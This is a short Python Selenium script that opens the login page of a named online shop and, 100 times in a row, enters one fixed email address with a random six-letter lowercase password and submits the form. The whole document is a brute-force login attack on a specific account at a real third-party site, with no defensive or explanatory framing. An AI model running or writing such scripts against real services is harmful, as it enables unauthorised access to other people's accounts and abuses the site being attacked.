import time
import string
import random

PATH = "C:\Selenium\chromedriver.exe"
from selenium import webdriver
from selenium.webdriver.common.keys import Keys

driver = webdriver.Chrome(PATH)
driver.get("https://aws.pesaschile.cl/iniciar-sesion?back=my-account")
time.sleep(2)

letters = string.ascii_lowercase
for x in range(100):
    user = driver.find_element_by_name("email")
    user.clear()
    user.send_keys("eupphory@gmail.com")  

    password = driver.find_element_by_name("password")
    str = ''.join(random.choice(letters) for i in range(4,10))
    password.send_keys(str)

    print(str)
    register = driver.find_element_by_xpath("/html/body/main/div[2]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/form/footer/button").click()
    time.sleep(2)